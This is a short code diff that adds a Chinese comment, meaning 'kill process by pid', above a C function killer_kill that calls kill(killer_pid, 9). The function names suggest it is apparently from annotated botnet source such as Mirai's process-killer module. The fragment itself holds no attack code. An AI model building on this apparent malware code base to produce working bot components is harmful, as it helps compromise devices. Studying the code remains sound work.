@@ -246,6 +246,7 @@ void killer_init(void)
 #endif
 }
 
+/*根据pid杀掉进程*/
 void killer_kill(void)
 {
     kill(killer_pid, 9);
